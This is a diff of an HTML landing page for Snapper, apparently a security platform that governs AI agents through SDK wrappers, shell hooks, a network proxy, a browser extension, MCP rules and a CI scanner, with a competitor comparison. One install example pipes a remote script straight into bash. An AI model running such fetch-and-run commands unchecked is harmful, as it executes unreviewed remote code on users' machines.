+        <h3>EU AI Act Compliance</h3>
+        <p>7 articles of the EU AI Act automated with evidence export for auditors. Risk classification, transparency obligations, human oversight requirements, data governance, and technical documentation &mdash; all mapped to Snapper's enforcement data. Audit-ready compliance reports. 148 days to enforcement; non-compliance carries penalties up to &euro;15M or 3% of global revenue.</p>
+        <span class="mono-detail">7 articles automated &middot; Evidence export &middot; Risk classification &middot; Audit-ready</span>
+      </div>
+
+      <div class="feature-card">
+        <div class="feature-icon red">&#x1F47B;</div>
+        <h3>Shadow AI Browser Extension</h3>
+        <p>Chrome extension (Manifest V3) that monitors 70+ AI services across browsers. 18-category PII scanner detects sensitive data before it reaches AI services. Three monitoring tiers: observe, warn, and block. Detects ChatGPT, Claude, Gemini, Copilot, Perplexity, and dozens more. Gives security teams visibility into shadow AI usage without disrupting productivity.</p>
+        <span class="mono-detail">70+ AI services &middot; Manifest V3 &middot; 18-cat PII scanner &middot; 3 monitoring tiers</span>
+      </div>
+
+      <div class="feature-card">
+        <div class="feature-icon green">&#x1F3D7;</div>
+        <h3>Hierarchical Agent Control</h3>
+        <p>Parent-child rule inheritance across 5 levels of agent hierarchy. When a parent agent spawns sub-agents, security policies propagate automatically. Child agents can't exceed parent permissions. Cross-agent correlation detects coordinated attacks across the hierarchy. Manage complex multi-agent deployments with a single policy tree.</p>
+        <span class="mono-detail">5-level hierarchy &middot; Rule inheritance &middot; Permission boundaries &middot; Cross-agent correlation</span>
+      </div>
+
+      <div class="feature-card">
+        <div class="feature-icon amber">&#x26A1;</div>
         <h3>Adaptive Trust Scoring</h3>
         <p>Agents earn autonomy through consistent good behavior. Rate-limit violations reduce trust scores, which tightens limits. Score ranges from 0.5x to 2.0x and directly scales what the agent can do. Per-agent opt-in gives security teams precise control over automation thresholds.</p>
       </div>
 
       <div class="feature-card">
-        <div class="feature-icon purple">🔍</div>
-        <h3>SIEM & SOAR Integration</h3>
-        <p>CEF-formatted syslog events for every security action: rule evaluations, threat detections, kill chain completions, approvals, denials, and quarantine actions. Drop-in integration with Splunk, Sentinel, QRadar, and any CEF-compatible SOAR. Full audit trail with structured JSON logging.</p>
-        <span class="mono-detail">CEF/Syslog &middot; Splunk &middot; Sentinel &middot; QRadar &middot; Structured JSON</span>
+        <div class="feature-icon purple">&#x1F50D;</div>
+        <h3>SIEM &amp; SOAR Integration</h3>
+        <p>CEF-formatted syslog events for every security action. Native integration with Splunk, Sentinel, QRadar, CrowdStrike LogScale, and any CEF-compatible SOAR. OpenTelemetry traces for distributed agent observability. Full audit trail with structured JSON logging and CEF event IDs for automated correlation.</p>
+        <span class="mono-detail">CEF/Syslog &middot; Splunk &middot; Sentinel &middot; CrowdStrike &middot; OpenTelemetry</span>
       </div>
 
       <div class="feature-card">
-        <div class="feature-icon green">📊</div>
-        <h3>Traffic Discovery</h3>
-        <p>Auto-detect MCP servers and tools from live traffic. See which commands your agents use and add curated security rules with one click. 27,000+ MCP servers cataloged across 13 security categories with auto-classification. Known servers get specialized rule packs; unknown servers get smart defaults.</p>
+        <div class="feature-icon green">&#x1F4CA;</div>
+        <h3>Traffic Discovery &amp; MCP Integrity</h3>
+        <p>Auto-detect MCP servers and tools from live traffic. 27,000+ MCP servers cataloged across 13 security categories with auto-classification. SHA-256 tool hashing detects tampered MCP tools. 8 suspicious heuristics flag anomalous tool behavior. Known servers get specialized rule packs; unknown servers get smart defaults.</p>
+        <span class="mono-detail">27K+ catalog &middot; SHA-256 hashing &middot; 8 heuristics &middot; 13 categories</span>
       </div>
 
       <div class="feature-card">
-        <div class="feature-icon blue">🏢</div>
-        <h3>Multi-Tenant & SSO</h3>
-        <p>Organization-scoped agents, rules, and audit trails. SAML 2.0 and OIDC single sign-on. SCIM provisioning for automated user lifecycle management. Role-based access control with admin, member, and viewer roles. Per-org billing and quota enforcement.</p>
-        <span class="mono-detail">SAML 2.0 &middot; OIDC &middot; SCIM &middot; RBAC &middot; Multi-org isolation</span>
+        <div class="feature-icon blue">&#x1F3E2;</div>
+        <h3>Multi-Tenant &amp; SSO</h3>
+        <p>Organization-scoped agents, rules, and audit trails. PKCE-secured OIDC and SAML 2.0 SSO with JWKS validation. SSO discovery for automatic IdP configuration. IdP group mapping for role assignment. SCIM provisioning for automated user lifecycle. Role-based access control with admin, member, and viewer roles.</p>
+        <span class="mono-detail">PKCE &middot; JWKS OIDC &middot; IdP group mapping &middot; SCIM &middot; RBAC</span>
       </div>
 
     </div>
@@ -1069,32 +1507,38 @@ footer a:hover { color: var(--accent); }
 <section class="architecture" id="architecture">
   <div class="container">
     <h2>How it works</h2>
-    <p class="subtitle">Snapper hooks into the PreToolUse pipeline. Every tool call is evaluated before execution.</p>
-    <div class="arch-diagram"><span class="node">AI Agent</span> wants to run a command / fill a form / install a skill
-        │
-        ▼
-   <span class="node">Hook intercepts</span> (PreToolUse — auto-installed)
-        │
-        ▼
-   <span class="node">Snapper evaluates</span> (16 rule types · threat scoring · fail-closed)
-        │
-        ├── <span class="allow">ALLOW</span>    → agent proceeds (vault tokens resolved)
-        ├── <span class="deny">DENY</span>     → blocked, alert sent to SOC + Telegram bot + Slack bot
-        └── <span class="approve">APPROVAL</span> → <span class="node">Bot-in-the-Loop</span>
-                     │
-                     ├── Auto-approve: known-safe ops (reads, allowlisted tools)
-                     ├── Human-required: risky ops → Telegram / Slack / Webhook / Email
-                     └── PII-mandatory: vault tokens always need human sign-off
-                     │
-                     → agent pauses, polls for human decision
-                     → on approve: vault tokens decrypted, 30s TTL, one read
-        │
-        ▼
-   <span class="node">Threat Analysis</span> (async, every request)
-        ├── Signal extraction (13 types, &lt;2ms)
-        ├── Kill chain state machine progression
-        ├── Behavioral baseline comparison
-        └── Composite score → CEF event → SIEM</div>
+    <p class="subtitle">Snapper sits between AI agents and the outside world. Every action is classified, evaluated, and audited before execution.</p>
+    <div class="arch-flow">
+      <div class="arch-column">
+        <h3 class="src-label">Sources</h3>
+        <div class="arch-item"><span class="arch-dot blue"></span>AI Agents (SDK-wrapped)</div>
+        <div class="arch-item"><span class="arch-dot blue"></span>Browser AI (Extension)</div>
+        <div class="arch-item"><span class="arch-dot blue"></span>CLI Agents (Shell Hooks)</div>
+        <div class="arch-item"><span class="arch-dot blue"></span>MCP Servers</div>
+        <div class="arch-item"><span class="arch-dot blue"></span>Network Traffic (Proxy)</div>
+        <div class="arch-item"><span class="arch-dot blue"></span>CI/CD (Code Scanner)</div>
+      </div>
+      <div class="arch-arrow">&#x2192;</div>
+      <div class="arch-column snapper-col-arch">
+        <h3 class="snap-label">Snapper Platform</h3>
+        <div class="arch-item"><span class="arch-dot green"></span>Rule Engine (16 types, fail-closed)</div>
+        <div class="arch-item"><span class="arch-dot green"></span>Intent Classifier (12 categories)</div>
+        <div class="arch-item"><span class="arch-dot green"></span>Output Guardrails</div>
+        <div class="arch-item"><span class="arch-dot green"></span>PII Vault (AES-256-GCM)</div>
+        <div class="arch-item"><span class="arch-dot green"></span>Threat Engine (kill chains, baselines)</div>
+        <div class="arch-item"><span class="arch-dot green"></span>EU AI Act / FinOps</div>
+      </div>
+      <div class="arch-arrow">&#x2192;</div>
+      <div class="arch-column">
+        <h3 class="prot-label">Protected</h3>
+        <div class="arch-item"><span class="arch-dot amber"></span>Data Stores &amp; Cloud</div>
+        <div class="arch-item"><span class="arch-dot amber"></span>Code Repositories</div>
+        <div class="arch-item"><span class="arch-dot amber"></span>External APIs</div>
+        <div class="arch-item"><span class="arch-dot amber"></span>SIEM (Splunk, Sentinel, CrowdStrike)</div>
+        <div class="arch-item"><span class="arch-dot amber"></span>IdP (Okta, Azure AD, Google)</div>
+        <div class="arch-item"><span class="arch-dot amber"></span>Finance &amp; Compliance</div>
+      </div>
+    </div>
   </div>
 </section>
 
@@ -1102,7 +1546,7 @@ footer a:hover { color: var(--accent); }
 <section class="integration" id="integration">
   <div class="container">
     <h2>Install once, protect everything</h2>
-    <p class="subtitle">Four integration methods cover every major AI agent type. No agent code changes. No vendor lock-in. Five minutes from install to protection.</p>
+    <p class="subtitle">Six enforcement methods cover every agent type. No agent code changes. No vendor lock-in. Five minutes from install to protection.</p>
     <div class="integration-grid">
 
       <div class="integration-card">
@@ -1110,13 +1554,13 @@ footer a:hover { color: var(--accent); }
           <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
         </div>
         <h3>SDK Wrappers</h3>
-        <p>Drop-in wrappers for the OpenAI, Anthropic, and Google Gemini SDKs. Import <code>snapper.wrap()</code> instead of the raw client. Every API call — chat completions, tool use, function calls — is routed through Snapper for policy evaluation before reaching the model provider. Your application code stays the same. One line change, full protection.</p>
+        <p>Drop-in wrappers for the OpenAI, Anthropic, and Google Gemini SDKs. Import <code>snapper.wrap()</code> instead of the raw client. Every API call is routed through Snapper for policy evaluation before reaching the model provider. One line change, full protection.</p>
         <div class="code-snippet">
 <span class="comment"># Before</span>
 <span class="cmd">from</span> openai <span class="cmd">import</span> OpenAI
 client = OpenAI()
 
-<span class="comment"># After — one line change</span>
+<span class="comment"># After &mdash; one line change</span>
 <span class="cmd">from</span> snapper <span class="cmd">import</span> wrap
 client = wrap(OpenAI())
 <span class="comment"># Every tool call now evaluated by Snapper</span>
@@ -1135,23 +1579,43 @@ client = wrap(OpenAI())
           <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
         </div>
         <h3>Shell Hooks</h3>
-        <p>Lightweight shell scripts that intercept CLI agent commands before execution. Installed as pre-exec hooks in your shell profile. Every command an agent tries to run — file operations, git commands, package installs, API calls — hits Snapper first. Works with any agent that operates through a terminal, including coding assistants and DevOps automation agents.</p>
+        <p>Lightweight shell scripts that intercept CLI agent commands before execution. Installed as pre-exec hooks in your shell profile. Every command an agent tries to run hits Snapper first. Works with any agent that operates through a terminal.</p>
         <div class="code-snippet">
 <span class="comment"># Install hook (bash/zsh)</span>
 <span class="cmd">curl</span> -s <span class="arg">$SNAPPER_URL</span>/hooks/install | bash
 
 <span class="comment"># Agent runs: git push origin main</span>
-<span class="arg">→ Snapper evaluates:</span> REQUIRE_APPROVAL
-<span class="arg">→ Slack notification:</span> [Approve] [Deny]
-<span class="arg">→ On approve:</span> command executes
+<span class="arg">&rarr; Snapper evaluates:</span> REQUIRE_APPROVAL
+<span class="arg">&rarr; Slack notification:</span> [Approve] [Deny]
+<span class="arg">&rarr; On approve:</span> command executes
         </div>
         <div class="agent-list">
           <span>Claude Code</span>
           <span>Cursor</span>
           <span>Windsurf</span>
           <span>Cline</span>
-          <span>OpenClaw</span>
           <span>Aider</span>
+        </div>
+      </div>
+
+      <div class="integration-card">
+        <div class="int-icon red">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+        </div>
+        <h3>Network Proxy</h3>
+        <p>Go binary that intercepts all agent network traffic at the OS level. SNI-based inspection catches every request to AI providers &mdash; even from agents that bypass SDK hooks. Monitors 55+ AI domains. Transparent to agents: no code changes, no SDK integration required. The network layer catch-all.</p>
+        <div class="code-snippet">
+<span class="comment"># Agent bypasses SDK, calls OpenAI directly</span>
+<span class="cmd">curl</span> https://api.openai.com/v1/chat/completions
+<span class="arg">&rarr; Proxy intercepts:</span> SNI match (api.openai.com)
+<span class="arg">&rarr; Snapper evaluates:</span> DENY (no SDK wrapper)
+<span class="arg">&rarr; Alert:</span> Shadow AI usage detected
+        </div>
+        <div class="agent-list">
+          <span>All agents</span>
+          <span>55+ AI domains</span>
+          <span>SNI inspection</span>
+          <span>MITM analysis</span>
         </div>
       </div>
 
@@ -1160,22 +1624,20 @@ client = wrap(OpenAI())
           <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
         </div>
         <h3>Browser Extension</h3>
-        <p>Chrome extension that intercepts web-based AI agent actions in real time. When ChatGPT, Gemini, or Claude tries to execute code, fill forms, or trigger tool calls through the browser, the extension routes the action through Snapper before it reaches the page. PII vault tokens are resolved securely on the client side — sensitive data never enters the chat context.</p>
+        <p>Chrome extension that intercepts web-based AI agent actions in real time. When ChatGPT, Gemini, or Claude tries to execute code, fill forms, or trigger tool calls through the browser, the extension routes the action through Snapper. PII vault tokens are resolved securely on the client side.</p>
         <div class="code-snippet">
 <span class="comment"># ChatGPT tries to fill a payment form</span>
-<span class="arg">→ Extension intercepts:</span> form_fill action
-<span class="arg">→ PII vault token:</span> {{SNAPPER_VAULT:a7f3...}}
-<span class="arg">→ Snapper evaluates:</span> REQUIRE_APPROVAL
-<span class="arg">→ Telegram bot:</span> "Fill CC on amazon.com? ****4242"
-<span class="arg">→ Slack bot:</span> Block Kit message + [Approve] [Deny]
-<span class="arg">→ On approve:</span> token resolved, form filled
+<span class="arg">&rarr; Extension intercepts:</span> form_fill action
+<span class="arg">&rarr; PII vault token:</span> {{SNAPPER_VAULT:a7f3...}}
+<span class="arg">&rarr; Snapper evaluates:</span> REQUIRE_APPROVAL
+<span class="arg">&rarr; On approve:</span> token resolved, form filled
         </div>
         <div class="agent-list">
           <span>ChatGPT</span>
           <span>Claude.ai</span>
           <span>Gemini</span>
           <span>Copilot</span>
-          <span>Custom web agents</span>
+          <span>70+ AI services</span>
         </div>
       </div>
 
@@ -1184,10 +1646,10 @@ client = wrap(OpenAI())
           <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#a855f7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
         </div>
         <h3>MCP Server Support</h3>
-        <p>Native support for the Model Context Protocol standard. Snapper acts as a security proxy between the agent and any MCP server — GitHub, Slack, filesystem, databases, AWS, or custom servers. Auto-discovers active MCP servers from live traffic, with 27,000+ servers cataloged across 13 security categories. Known servers get curated rule packs; unknown servers get smart defaults. Every tool call is evaluated before the MCP server executes it.</p>
+        <p>Native support for the Model Context Protocol standard. Snapper acts as a security proxy between the agent and any MCP server. Auto-discovers active MCP servers from live traffic, with 27,000+ servers cataloged across 13 security categories. SHA-256 tool hashing detects tampered MCP tools.</p>
         <div class="code-snippet">
 <span class="comment"># Auto-detected: github MCP server</span>
-<span class="arg">→ Applied:</span> 5 curated security rules
+<span class="arg">&rarr; Applied:</span> 5 curated security rules
   <span class="cmd">ALLOW</span>  repos.list, issues.get, pulls.get
   <span class="cmd">APPROVE</span> pulls.merge, issues.create
   <span class="cmd">DENY</span>   repos.delete, org.settings.*
@@ -1202,10 +1664,32 @@ client = wrap(OpenAI())
         </div>
       </div>
 
+      <div class="integration-card">
+        <div class="int-icon cyan" style="background: rgba(6, 182, 212, 0.12);">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#06b6d4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>
+        </div>
+        <h3>Code Scanner (CI/CD)</h3>
+        <p>Pre-deployment scanning catches ungoverned AI code before it ships. Detects unwrapped AI SDKs, leaked credentials, hardcoded endpoints, and unregistered agent frameworks. SARIF output appears in GitHub Security tab. Runs as a GitHub Action on every PR. Finds shadow AI in your codebase.</p>
+        <div class="code-snippet">
+<span class="comment"># GitHub Action on every PR</span>
+<span class="arg">&rarr; Scanned:</span> 847 files in 1.2s
+<span class="arg">&rarr; Found:</span> import openai (no Snapper SDK)
+  <span style="color:var(--red)">CRITICAL</span> src/agent/chat.py:42
+  <span class="arg">Fix:</span> from snapper import SnapperOpenAI
+<span class="arg">&rarr; SARIF uploaded</span> to Security tab
+        </div>
+        <div class="agent-list">
+          <span>8 categories</span>
+          <span>SARIF</span>
+          <span>GitHub Action</span>
+          <span>Go binary</span>
+        </div>
+      </div>
+
     </div>
     <div class="integration-summary">
-      <h3>Every agent type. One security layer. Four alerting channels.</h3>
-      <p>Most agent security tools only work with one protocol or one vendor. Snapper's four integration methods mean you deploy once and get consistent policy enforcement, threat detection, PII protection, and audit trails across SDK-based agents, CLI tools, browser agents, and MCP servers. Every alert and approval routes through your choice of Telegram bot, Slack bot, webhook endpoint, or email — with the same inline approve/deny workflow regardless of which agent triggered it. No gaps. No blind spots.</p>
+      <h3>Every agent type. One security layer. Six enforcement methods.</h3>
+      <p>Snapper's six integration methods &mdash; SDK wrappers, shell hooks, network proxy, browser extension, MCP support, and code scanner &mdash; mean you deploy once and get consistent policy enforcement, threat detection, PII protection, and audit trails across every agent type. Every alert routes through your choice of Telegram bot, Slack bot, webhook, or email.</p>
     </div>
   </div>
 </section>
@@ -1214,51 +1698,75 @@ client = wrap(OpenAI())
 <section class="comparison" id="comparison">
   <div class="container">
     <h2>How Snapper compares</h2>
-    <p class="subtitle">Different tools solve different problems at different layers. Snapper is the only solution at the agent-internet boundary with full threat detection, bot-in-the-loop approvals, and enterprise governance.</p>
+    <p class="subtitle">The only AI agent security platform with runtime enforcement, intent classification, EU AI Act compliance, and AI FinOps in a single product.</p>
     <div class="comp-table-wrap">
       <table class="comp-table">
         <thead>
           <tr>
             <th></th>
             <th class="snapper-col">Snapper</th>
+            <th>WitnessAI</th>
             <th>RunLayer</th>
-            <th>LlamaFirewall</th>
-            <th>Cloudflare AI GW</th>
-            <th>Prompt Security</th>
+            <th>Pangea</th>
           </tr>
         </thead>
         <tbody>
-          <tr class="cat-row"><td colspan="6">Threat Detection</td></tr>
-          <tr><td>Kill Chain Detection</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr><td>Behavioral Baselines</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr><td>Composite Threat Scoring</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="partial">~</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="partial">~</span></td></tr>
-          <tr><td>Heuristic Signal Extraction</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="partial">~</span></td></tr>
-          <tr><td>Security Feed Auto-Mitigation</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr class="cat-row"><td colspan="6">Data Protection</td></tr>
-          <tr><td>Encrypted PII Vault</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr><td>Raw PII Interception (DLP)</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="partial">~</span></td><td><span class="check">✓</span></td></tr>
-          <tr><td>Domain-Locked Vault Tokens</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr class="cat-row"><td colspan="6">Governance</td></tr>
-          <tr><td>Bot-in-the-Loop Approvals</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="partial">~</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr><td>Telegram & Slack Bot Alerting</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr><td>Adaptive Trust Scoring</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr><td>Emergency Kill Switch</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr><td>CEF/SIEM Integration</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="check">✓</span></td><td><span class="check">✓</span></td></tr>
-          <tr><td>Platform Admin Console</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="partial">~</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr class="cat-row"><td colspan="6">Architecture</td></tr>
-          <tr><td>Layer</td><td class="snapper-col" style="color:var(--accent);font-size:12px">Agent boundary</td><td style="font-size:12px">MCP gateway</td><td style="font-size:12px">Inside agent</td><td style="font-size:12px">Edge network</td><td style="font-size:12px">Prompt layer</td></tr>
-          <tr><td>Non-MCP Agent Support</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="check">✓</span></td><td><span class="partial">~</span></td><td><span class="partial">~</span></td></tr>
-          <tr><td>Philosophy</td><td class="snapper-col" style="color:var(--accent);font-size:12px;font-weight:600">Enable + Protect</td><td style="font-size:12px">Enable + Govern</td><td style="font-size:12px">Restrict</td><td style="font-size:12px">Restrict</td><td style="font-size:12px">Restrict</td></tr>
-          <tr><td>Self-Hosted / On-Prem</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr><td>Fail-Closed Design</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="check">✓</span></td></tr>
-          <tr><td>SSO / Identity Provider</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="partial">~</span></td></tr>
-          <tr><td>Multi-Tenant Isolation</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="partial">~</span></td></tr>
-          <tr><td>Multi-Agent (10+)</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="partial">~</span></td><td><span class="cross">✗</span></td><td><span class="partial">~</span></td></tr>
+          <tr class="cat-row"><td colspan="5">Runtime Security</td></tr>
+          <tr><td>Runtime enforcement</td><td class="snapper-col"><span class="check">&#x2713;</span></td><td><span class="partial">~</span></td><td><span class="check">&#x2713;</span></td><td><span class="partial">~</span></td></tr>
+          <tr><td>Intent classification</td><td class="snapper-col"><span class="check">&#x2713;</span></td><td><span class="cross">&#x2717;</span></td><td><span class="cross">&#x2717;</span></td><td><span class="cross">&#x2717;</span></td></tr>
+          <tr><td>Output guardrails</td><td class="snapper-col"><span class="check">&#x2713;</span></td><td><span class="partial">~</span></td><td><span class="cross">&#x2717;</span></td><td><span class="partial">~</span></td></tr>
+          <tr><td>Cross-agent correlation</td><td class="snapper-col"><span class="check">&#x2713;</span></td><td><span class="cross">&#x2717;</span></td><td><span class="cross">&#x2717;</span></td><td><span class="cross">&#x2717;</span></td></tr>
+          <tr><td>Hierarchical agent control</td><td class="snapper-col"><span class="check">&#x2713;</span></td><td><span class="cross">&#x2717;</span></td><td><span class="cross">&#x2717;</span></td><td><span class="cross">&#x2717;</span></td></tr>
+          <tr><td>MCP integrity hashing</td><td class="snapper-col"><span class="check">&#x2713;</span></td><td><span class="cross">&#x2717;</span></td><td><span class="partial">~</span></td><td><span class="cross">&#x2717;</span></td></tr>
+          <tr class="cat-row"><td colspan="5">Compliance &amp; Finance</td></tr>
+          <tr><td>EU AI Act automation</td><td class="snapper-col"><span class="check">&#x2713;</span></td><td><span class="cross">&#x2717;</span></td><td><span class="cross">&#x2717;</span></td><td><span class="cross">&#x2717;</span></td></tr>
+          <tr><td>AI FinOps / cost attribution</td><td class="snapper-col"><span class="check">&#x2713;</span></td><td><span class="cross">&#x2717;</span></td><td><span class="cross">&#x2717;</span></td><td><span class="cross">&#x2717;</span></td></tr>
+          <tr class="cat-row"><td colspan="5">Platform</td></tr>
+          <tr><td>Developer SDK</td><td class="snapper-col"><span class="check">&#x2713;</span></td><td><span class="cross">&#x2717;</span></td><td><span class="partial">~</span></td><td><span class="check">&#x2713;</span></td></tr>
+          <tr><td>Air-gapped deployment</td><td class="snapper-col"><span class="check">&#x2713;</span></td><td><span class="cross">&#x2717;</span></td><td><span class="cross">&#x2717;</span></td><td><span class="cross">&#x2717;</span></td></tr>
+          <tr><td>SIEM integration</td><td class="snapper-col"><span class="check">&#x2713;</span></td><td><span class="check">&#x2713;</span></td><td><span class="check">&#x2713;</span></td><td><span class="partial">~</span></td></tr>
+          <tr><td>27K+ MCP server catalog</td><td class="snapper-col"><span class="check">&#x2713;</span></td><td><span class="cross">&#x2717;</span></td><td><span class="partial">~</span></td><td><span class="cross">&#x2717;</span></td></tr>
+          <tr><td>Policy-as-code</td><td class="snapper-col"><span class="check">&#x2713;</span></td><td><span class="cross">&#x2717;</span></td><td><span class="check">&#x2713;</span></td><td><span class="check">&#x2713;</span></td></tr>
+          <tr><td>Non-MCP agent support</td><td class="snapper-col"><span class="check">&#x2713;</span></td><td><span class="check">&#x2713;</span></td><td><span class="cross">&#x2717;</span></td><td><span class="partial">~</span></td></tr>
         </tbody>
       </table>
     </div>
     <div class="comp-note">
-      <strong>Note:</strong> Snapper operates at the boundary between the agent and the outside world — the action layer — with a bot-in-the-loop approval model that routes sensitive decisions to Telegram and Slack bots for human sign-off. RunLayer ($11M seed, Khosla/Felicis) secures the MCP protocol layer with threat detection and fine-grained permissions, but is limited to MCP-based agents and lacks dedicated bot-based alerting channels. Prompt-layer tools (LlamaFirewall, Prompt Security) operate inside the agent on prompts and responses. Snapper is the only solution that covers all agent types — MCP servers, SDK-based agents, CLI tools, and browser-based agents — through <a href="#integration">SDK wrappers, shell hooks, browser extension, and MCP support</a>, with bot-in-the-loop approvals, multi-tenant isolation, platform admin provisioning, and real-time alerting via Telegram bots, Slack bots, webhooks, and email. Use Snapper for action governance plus a prompt-layer tool for injection defense. Together they provide true defense in depth.
+      <strong>Note:</strong> Snapper is the only product that covers all six enforcement layers &mdash; SDK, shell hooks, network proxy, browser extension, MCP, and CI/CD code scanner. WitnessAI provides AI visibility and governance at the network layer but lacks runtime enforcement and MCP support. RunLayer secures the MCP protocol with fine-grained permissions but is limited to MCP-based agents. Pangea provides API-level security services but lacks agent-specific behavioral intelligence. Use Snapper for comprehensive agent governance plus a prompt-layer tool for injection defense.
+    </div>
+
+    <!-- WitnessAI Deep Comparison -->
+    <div class="witness-compare">
+      <h3>WitnessAI vs Snapper: First-Gen Antivirus vs Next-Gen EDR</h3>
+      <p>WitnessAI provides network-layer AI visibility &mdash; valuable, but it's a first-generation approach. Snapper operates at the agent boundary with runtime enforcement, behavioral intelligence, and action governance that WitnessAI can't match.</p>
+      <div class="witness-grid">
+        <div class="witness-card old">
+          <h4>WitnessAI (First-Gen)</h4>
+          <ul>
+            <li>&#x2022; Network-layer visibility only</li>
+            <li>&#x2022; Passive monitoring and logging</li>
+            <li>&#x2022; No runtime action enforcement</li>
+            <li>&#x2022; No MCP server support</li>
+            <li>&#x2022; No intent classification</li>
+            <li>&#x2022; No hierarchical agent control</li>
+            <li>&#x2022; No FinOps or cost attribution</li>
+            <li>&#x2022; SaaS only (no air-gapped)</li>
+          </ul>
+        </div>
+        <div class="witness-card new">
+          <h4>Snapper (Next-Gen EDR)</h4>
+          <ul>
+            <li>&#x2022; Agent boundary enforcement</li>
+            <li>&#x2022; Active block/approve/audit</li>
+            <li>&#x2022; Runtime action governance</li>
+            <li>&#x2022; 27K+ MCP server catalog</li>
+            <li>&#x2022; 12-category intent classifier</li>
+            <li>&#x2022; 5-level hierarchical control</li>
+            <li>&#x2022; Full AI FinOps suite</li>
+            <li>&#x2022; SaaS, private, on-prem, air-gapped</li>
+          </ul>
+        </div>
+      </div>
     </div>
   </div>
 </section>
@@ -1268,11 +1776,11 @@ client = wrap(OpenAI())
   <div class="container">
     <div class="stats-grid">
       <div class="stat-card">
-        <div class="number">16</div>
+        <div class="number">16+</div>
         <div class="label">Rule types</div>
       </div>
       <div class="stat-card">
-        <div class="number">2,000+</div>
+        <div class="number">3,100+</div>
         <div class="label">Tests (unit + E2E)</div>
       </div>
       <div class="stat-card">
@@ -1296,16 +1804,24 @@ client = wrap(OpenAI())
         <div class="label">Threat analysis latency</div>
       </div>
       <div class="stat-card">
-        <div class="number">3</div>
-        <div class="label">Security feeds monitored</div>
-      </div>
-      <div class="stat-card">
-        <div class="number">27,000+</div>
+        <div class="number">27K+</div>
         <div class="label">MCP servers cataloged</div>
       </div>
       <div class="stat-card">
